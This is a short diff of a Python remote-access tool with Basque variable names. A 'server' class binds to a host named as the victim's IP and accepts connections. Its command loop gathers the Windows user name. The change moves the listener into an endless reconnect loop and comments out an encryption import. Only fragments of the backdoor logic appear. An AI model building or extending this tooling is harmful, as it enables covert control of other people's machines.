@@ -6,6 +6,7 @@ import sys
 import threading
 import zlib
 import pickle
+#from fitxategiak.asimetric import asime
 
 
 class server(object):
@@ -18,6 +19,8 @@ class server(object):
         self.so.bind((ip_bictima,portua))
         self.so.listen(koneksioak)
         self.soc , addr = self.so.accept()
+
+
     
     def comandLine(self):
           user = win32api.GetUserName()
@@ -135,8 +138,9 @@ class server(object):
       #self.so.close()tcp koneksioa amaitu
       self.soc.close()#tcp koneksioa amaitu
 
-ser = server("192.168.0.14",9999,1)
+
 while True:
+    ser = server("192.168.0.14",9999,1)
     ser.comandLine()
 
 
